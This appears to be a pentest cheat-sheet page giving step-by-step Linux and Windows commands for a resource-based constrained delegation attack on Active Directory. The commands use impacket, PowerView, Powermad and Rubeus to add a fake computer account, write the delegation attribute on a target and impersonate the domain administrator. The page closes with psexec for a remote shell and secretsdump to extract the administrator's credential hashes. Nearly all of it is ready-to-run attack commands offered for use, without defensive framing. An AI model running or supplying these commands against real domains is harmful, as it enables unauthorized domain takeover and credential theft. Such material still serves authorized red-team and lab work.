---
title: "RBCD Attack"
date: 2024-7-30
tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-based constrained delegation", "s4u", "impersonate"]
---

### RBCD Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Check machine account quota

```console
nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' -M MAQ
```

#### 1. Add a fake computer

```console
impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <TARGET> '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 2. Rbcd attack

```console
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 3. Impersonate

```console
sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
```

#### 4. Import ticket

```console
export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
```

#### 5. Post-Attack

```console
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Modules

```console
. .\PowerView.ps1
```

```console
. .\Powermad.ps1
```

#### 2. Check machine account quota

```console
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

#### 3. Create new computer account

```console
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
```

<small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>

#### 4. RBCD Attack

```console
$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```console
$fakesid
```

```console
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console
$SD.GetBinaryForm($SDBytes, 0)
```

```console
Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### 5. Check if SecurityIdentifier is now fakesid 

```console
$RawBytes = Get-DomainComputer TARGET_COMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console
$Descriptor.DiscretionaryAcl
```

#### 6. Impersonate

```console
.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:EvilComputer /domain:<DOMAIN>
```

```console
.\rubeus.exe s4u /user:'EvilComputer$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
```

#### 7. Convert to ccache format

```console
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

```console
export KRB5CCNAME=secrets.ccache
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

#### 8. Post-Attack

```console
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

{{< /tabcontent >}}
